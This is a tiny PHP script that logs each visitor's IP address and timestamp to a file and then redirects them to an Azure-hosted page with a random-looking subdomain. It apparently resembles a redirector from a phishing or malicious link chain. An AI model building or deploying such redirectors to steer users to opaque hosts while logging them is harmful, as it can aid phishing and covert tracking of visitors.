<?php
// Optional: log data to a file
file_put_contents("log.txt", date("Y-m-d H:i:s") . " - " . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);

// Redirect
header("Location: https://2201jsbdbnbdsnbsnbncbd-secondary.z13.web.core.windows.net/");
exit();
?>
